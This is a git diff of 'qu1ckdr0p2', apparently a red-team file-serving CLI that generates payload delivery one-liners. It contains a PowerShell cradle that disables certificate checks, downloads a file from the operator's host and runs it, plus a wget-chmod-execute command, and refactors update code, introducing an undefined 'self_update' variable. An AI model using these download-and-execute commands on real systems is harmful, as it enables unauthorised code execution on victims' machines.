@@ -1,6 +1,5 @@
-import hashlib
 from flask import Flask, send_from_directory
-from flask.logging import default_handler, request
+from flask.logging import request
 from tqdm import tqdm
 from halo import Halo
 from OpenSSL import crypto
@@ -9,7 +8,6 @@ import netifaces as ni
 import logging
 import click
 import configparser
-import requests
 import subprocess
 import signal
 import sys
@@ -26,7 +24,7 @@ user_home = os.path.expanduser("~")
 base_dir = os.path.join(user_home, ".qu1ckdr0p2")
 directory = os.path.dirname(os.path.abspath(__file__))
 
-target_directories = ["config", "windows", "linux", "mac", "windows/powershell"]
+target_directories = ["config", "windows", "linux", "mac", "windows/powershell", "windows/powershell/PowerSharpPack/PowerSharpBinaries", "windows/powershell/PowerSharpPack"]
 other_directories = ["payloads", "certs"]
 
 payloads = os.path.join(user_home, ".qu1ckdr0p2", 'payloads')
@@ -140,7 +138,7 @@ def generate_code_outputs(protocol, ip_address, port, filename):
                 f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
                 f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
                 f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
-                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); powershell -ep bypass; Start-Process 'c:\\windows\\temp\\{filename}'"
+                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}');Start-Process 'c:\\windows\\temp\\{filename}'"
             )
 
             wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"
@@ -289,76 +287,6 @@ def invoke_serve_by_number(search=None, use=None, http=None, https=None):
     selected_path = search_results[selected_alias]
     serve_files(selected_path, http, https)
 
-def create_directory(dir_path):
-    if not os.path.exists(dir_path):
-        os.makedirs(dir_path)
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Created directory:", fg='yellow') + click.style(f" {dir_path}", fg='blue'))
-
-def handle_github_auth(api_key):    
-    if api_key:
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Using Github API key for authentication", fg='yellow'))
-        click.echo(click.style(f"[→] ", fg='green') + click.style("Github API key:", fg='yellow') + click.style(f" {api_key}", fg='blue'))
-    else:
-        click.echo(click.style(f"[-] ", fg='red') + click.style("No Github API key provided", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("An API key is required to avoid rate limiting during downloads.", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("This will be resolved in the future using releases.", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("Generate a token: https://github.com/settings/tokens/new", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("Select the 'public_repo' scope", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("Copy the token and run the following command:", fg='yellow'))
-        click.echo(click.style(f"[*] ", fg='red') + click.style("serv init --api-key <token>", fg='yellow'))
-        sys.exit(0)
-        
-
-def handle_directory(directory, headers, check):
-    target_path = os.path.join(base_dir, directory)
-    target_url = f"https://api.github.com/repos/byinarie/qu1ckdr0p2/contents/qu1ckdr0p2/{directory}"         
-    response = requests.get(target_url, headers=headers)
-    if response.status_code != 200:
-        click.echo(click.style(f"[-] ", fg='red') + click.style("Failed to fetch directory contents for:", fg='yellow') 
-                   + click.style(f" {target_url}", fg='blue') + click.style(f" \nStatus Code:", fg='yellow') + click.style(f" {response.status_code}", fg='red')
-                   + click.style(f" \nReason:", fg='yellow') + click.style(f" {response.reason}\n", fg='red')
-        )
-        return
-
-    files = response.json()
-    local_files = list_local_files(target_path)
-
-    for file_info in tqdm(files, desc='Processing files', unit='file'):
-        if file_info['type'] != 'file':
-            continue
-        file_name = file_info['name']
-        file_url = file_info.get('download_url')
-        if not file_url:
-            click.echo(click.style(f"[-] ", fg='red') + click.style("Download URL not found", fg='yellow') + click.style(f" {file_name}\n\n", fg='blue'))
-            continue
-        file_path = os.path.join(target_path, file_name)
-        if check:
-            if file_name not in local_files:
-                download_and_save_file(file_url, file_path)
-            else:
-                with open(file_path, 'rb') as f:
-                    existing_content = f.read()
-                existing_sha1 = calculate_git_blob_sha1(existing_content)
-                expected_sha1 = file_info.get('sha')
-                if existing_sha1 != expected_sha1:
-                    download_and_save_file(file_url, file_path)
-                    click.echo(click.style(f"[→] ", fg='green') + click.style("Updated: ", fg='yellow') + click.style(f" {file_url}\n\n", fg='blue'))
-        else:
-            download_and_save_file(file_url, file_path)
-
-def download_and_save_file(url, file_path):
-    response = requests.get(url)
-    if response.status_code == 200:
-        with open(file_path, 'wb') as f:
-            f.write(response.content)
-            click.echo(click.style(f"[→] ", fg='green') + click.style("Downloaded", fg='yellow') + click.style(f" {file_path}\n", fg='blue'))
-    else:
-        click.echo(click.style(f"[-] ", fg='red') + click.style("Failed to download", fg='yellow') + click.style(f" {file_path}\n\n", fg='blue'))
-
-def calculate_git_blob_sha1(data):
-    content_length = len(data)
-    return hashlib.sha1(f'blob {content_length}\0'.encode() + data).hexdigest()
-
 def list_local_files(directory_path):
     return set(os.listdir(directory_path))
 
@@ -388,14 +316,14 @@ def cli(ctx, debug):
 @click.option('-l', '--list', 'list_flag', is_flag=True, help="List aliases")
 @click.option('-s', '--search', type=str, required=False, help="Search query for aliases")
 @click.option('-u', '--use', type=int, required=False, help="Use an alias by a dynamic number")
-@click.option('-d', '--directory', type=click.Path(exists=True, file_okay=False), help="Serve a directory")
+# @click.option('-d', '--directory', type=click.Path(exists=True, file_okay=False), help="Serve a directory")
 @click.option('-f', '--file', type=click.Path(exists=True, dir_okay=False), help="Serve a file")
 @click.option('--http', type=int, default=None, help="Use HTTP with a custom port")
 @click.option('--https', type=int, default=None, help="Use HTTPS with a custom port")
 @click.pass_context
-def serve(ctx, list_flag, search, use, directory, file, http, https):
+def serve(ctx, list_flag, search, use, file, http, https):
     """Serve files."""          
-    if not any([list_flag, search, use, directory, file, http, https]):
+    if not any([list_flag, search, use, file, http, https]):
         click.echo(ctx.get_help())
         return
         
@@ -435,22 +363,34 @@ def init(update, update_self, update_self_test):
     """Perform updates."""
     if update:
         check_and_update_tools()
+    if self_update:
+        update_pip3()
 
 
 def check_and_update_tools():
     if not os.path.exists(base_dir):
-        print(f"Directory {base_dir} does not exist. Cloning from GitHub.")
+        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Cloning qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
         try:
             subprocess.run(["git", "clone", "https://github.com/byinarie/qu1ckdr0p2-tools.git", base_dir], check=True)
         except subprocess.CalledProcessError as e:
-            print(f"Error occurred: {e}")
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to clone qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
     else:
         print(f"Directory {base_dir} exists. Pulling latest changes.")
+        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Pulling latest changes from GitHub.\n", fg='yellow'))
         try:
             subprocess.run(["git", "-C", base_dir, "pull"], check=True)
         except subprocess.CalledProcessError as e:
             print(f"Error occurred: {e}")   
-                              
+            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to pull latest changes from GitHub.\n", fg='yellow'))
+
+def update_pip3():
+    """Update the tool using pip."""
+    try:
+        subprocess.run(['pip3', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
+        click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
+    except subprocess.CalledProcessError as e:
+        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
+                            
 if __name__ == "__main__":
     target_directory = os.path.dirname(os.path.abspath(__file__))   
     cli(obj={})
